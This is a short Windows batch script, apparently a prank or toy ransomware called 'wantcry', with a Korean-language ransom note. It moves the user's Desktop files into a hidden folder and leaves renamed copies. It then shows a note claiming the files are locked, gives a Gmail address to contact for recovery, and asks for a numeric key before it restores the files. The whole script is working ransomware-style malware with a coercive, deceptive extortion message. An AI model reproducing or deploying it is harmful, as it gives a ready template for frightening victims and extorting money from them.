@echo off
color 4f
title wantcry 랜섬웨어
md C:\error
ping localhost -n 2 >NUL
move "%userprofile%\Desktop\*.*" "C:\error\"
copy "C:\error\*.*" "%userprofile%\Desktop\*.wantcry*" 
set /a pass=%random% %% 9999+1000
echo %pass% >> %userprofile%\Desktop\코드.wantcry 
cls
echo wantcry 랜섬웨어
echo -----------------------------------------------------------
echo 제 파일은 어떻게 되었습니까? 
echo 당신의 파일은 우리 소프트웨어에서 보호제공을 받으며 
echo 복구를 할때까지 파일을 사용할수 없습니다 
echo -----------------------------------------------------------
echo 어떻게 복구합니까? 
echo 복구를 하려면 복구 프로그램이 필요합니다 
echo 복구 프로그램를 얻는 방법은 쉽습니다
echo jooseohoo@gmail.com 으로 연락하십시오
echo -----------------------------------------------------------
echo 만약 컴퓨터를 다시시작한다면 재부팅해도 소용없을겁니다 
echo 만약 wantcry 랜섬웨어를 제거할 경우 파일이 안전하지 않을것 입니다.  
echo 만약에 복구키를 가지고 있다면 아래 창에다 입력하십시오
echo -----------------------------------------------------------
set /p password=입력:
if %password% == %pass% goto pass
cls
echo 틀렸습니다...
echo 파일을 복구할수 없습니다.
pause>nul
exit
:pass
msg * /server 127.0.0.1 -v 복구중 입니다 기다려 주세요...
ping localhost -n 2 >NUL
del %userprofile%\Desktop\*.wantcry*
move C:\error\*.* %userprofile%\Desktop\
ping localhost -n 2 >NUL
del %userprofile%\Desktop\*코드.txt*
title 해독을 성공했군...
cls
echo 해독을 성공했습니다.
echo 파일은 자동으로 원래 있던곳으로 되돌아 갑니다.
pause>nul
exit
